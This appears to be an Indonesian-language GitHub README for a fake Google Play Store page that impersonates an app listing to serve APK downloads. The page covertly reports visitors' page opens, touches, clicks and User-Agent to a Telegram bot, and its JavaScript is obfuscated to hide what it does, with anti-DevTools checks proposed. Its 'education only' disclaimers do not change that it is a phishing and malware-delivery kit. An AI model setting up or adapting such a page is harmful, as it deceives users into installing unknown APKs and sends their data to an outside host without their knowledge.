![Edukasi Only](https://img.shields.io/badge/Edukasi%20Only-Important-red?style=flat-square&logo=bookstack)
![JavaScript](https://img.shields.io/badge/JavaScript-ES6-yellow?style=flat-square&logo=javascript)
![Telegram Bot](https://img.shields.io/badge/Telegram%20Bot-Integrated-blue?style=flat-square&logo=telegram)
![License](https://img.shields.io/badge/License-CC0--1.0-lightgrey?style=flat-square)

# 🚀 Google Play Clone – Telegram Bot & JS Obfuscation

---

## ⚠️ **Peringatan Etika & Hukum** (Wajib Baca!)

**Project ini 100% hanya untuk tujuan edukasi, dokumentasi, dan riset keamanan pribadi.**  

- Notifikasi Telegram hanya boleh dikirim ke akun/Chat ID milik sendiri.  
- Dilarang keras memantau, mengumpulkan data, atau mengirim info ke orang lain tanpa izin eksplisit → melanggar UU ITE, UU PDP, dll.  
- Penulis tidak bertanggung jawab atas segala bentuk penyalahgunaan kode ini.  

---

## 📖 **Daftar Isi**

1️⃣ Pengenalan  
2️⃣ Fitur Utama  
3️⃣ Instalasi & Setup  
4️⃣ Build Project  
5️⃣ Struktur Folder  
6️⃣ Alur Kerja (Educational)  
7️⃣ Catatan Keamanan  
8️⃣ Legal Notice  

---

## 🎯 **Pengenalan**

Clone sederhana tampilan Google Play Store (support PWA) yang terintegrasi dengan Telegram Bot untuk kirim notifikasi event, plus JavaScript Obfuscation untuk proteksi kode.  

**Tujuan utama:**  
- Belajar integrasi Telegram Bot API ke website  
- Memahami teknik obfuscation JS agar kode susah dibaca/dimodifikasi  
- Mengamati event flow di environment lokal pribadi  

---

## ✨ **Fitur Utama**

- UI mimic Google Play Store (`index.html` + `manifest.json` + `sw.js`)  
- Telegram Bot kirim notifikasi real-time (page open, touch event, klik download)  
- Obfuscation JS otomatis via `npm run build`  
- Output di folder `dist/`  
- Ambil User-Agent untuk edukasi fingerprinting dasar  

---

## 🧰 **Instalasi & Setup**

1️⃣ **Clone Repository**

```bash
git clone https://github.com/raghid-setiawan/google-play-clone.git
cd google-play-clone
```

---

2️⃣ **Ganti Placeholder Wajib** *(EDUKASI ONLY – lakukan untuk test lokal SAJA)*

#### 🔹 Edit `index.html`

Cari teks:

```text
Huggle: Free Video Call
```

Ganti dengan nama APK milikmu sendiri:

```text
My Test App v1.0
```

---

#### 🔹 Edit `js/app.js`

```js
// Ubah pesan notif sesuai kebutuhan
await sendTelegram('User started APK download');

// Contoh ganti:
await sendTelegram('Download dimulai: nama-apk.apk');
```

```js
// Ubah link download
link.href = 'https://t.me/Sec_Society';

// Ganti menjadi:
// 'apk/nama-file-kamu.apk' → direct dari folder apk/
// atau link eksternal lain
```

```js
// Ubah nama file download
link.download = 'test.apk';

// Ganti menjadi:
// 'nama-file-apk-kamu.apk'
// (harus sesuai nama file asli)
```

---

3️⃣ **Setup Telegram Bot**

Buka file:

```bash
js/app.js
```

Cari baris:

```js
const TG_TOKEN = ''; // YOUR BOT TOKEN
const TG_CHAT  = ''; // YOUR CHAT ID
```

Ganti nilai di dalam `' '` dengan token & chat ID milikmu sendiri **untuk test lokal SAJA**.  

⚠️ Setelah test selesai, kembalikan ke:

```js
const TG_TOKEN = '';
const TG_CHAT  = '';
```

sebelum commit / push.

---

4️⃣ **Install Dependencies**

```bash
npm install
```

---

### 📌 Catatan Penting

- Semua penggantian di langkah 2 hanya untuk eksperimen pribadi  
- **JANGAN COMMIT** token, link, atau nama file asli ke repo  
- Kembalikan semua placeholder ke nilai awal sebelum push  
- Gunakan bot khusus testing (buat baru via `@BotFather`)  
- Test hanya di localhost / environment pribadi  

---

## 🛠 **Build Project**

1️⃣ Jalankan perintah berikut untuk membangun versi obfuscated:

```bash
npm run build
```

2️⃣ Output akan berada di folder `dist/`.  

3️⃣ Test lokal setelah build:

```bash
npx live-server dist/
```

Buka `http://localhost:8080` → lakukan interaksi → cek notifikasi masuk di Telegram pribadi.

---

## 📁 **Struktur Folder**

```
.
├── apk/          # Contoh APK (edukasi only)
├── dist/         # Hasil build obfuscated
├── img/          # Asset gambar (screenshot & blueprint)
├── js/           # Source JS (app.js dll)
├── scripts/      # Build script (build.js)
├── index.html
├── manifest.json
├── sw.js
├── package.json
├── package-lock.json
```

---

## 🔎 **Alur Kerja (Educational)**

1️⃣ Buka halaman localhost  
2️⃣ Event listener aktif (DOMContentLoaded, touch, dll)  
3️⃣ Kumpul info sederhana (User-Agent, event)  
4️⃣ Kirim via fetch ke Telegram API (bot milik sendiri)  
5️⃣ Bot terima notifikasi  
6️⃣ Kode di `dist/` sudah obfuscated → latihan proteksi source  

---

## 🔐 **Catatan Keamanan & Edukasi**

- JANGAN commit token/chat ID asli ke repo  
- Gunakan bot token khusus testing (bikin baru via `@BotFather`)  
- Test hanya di localhost / VM / sandbox pribadi  
- Obfuscation untuk belajar proteksi kode, bukan untuk hal negatif  
- Ide lanjutan (legal): deteksi DevTools, anti-debug check  

---

## 📜 **Legal Notice**

- Project ini murni untuk edukasi dan penelitian pribadi  
- Gunakan secara legal dan etis  
- Ide awal dari sumber edukasi Telegram, hanya untuk pembelajaran  

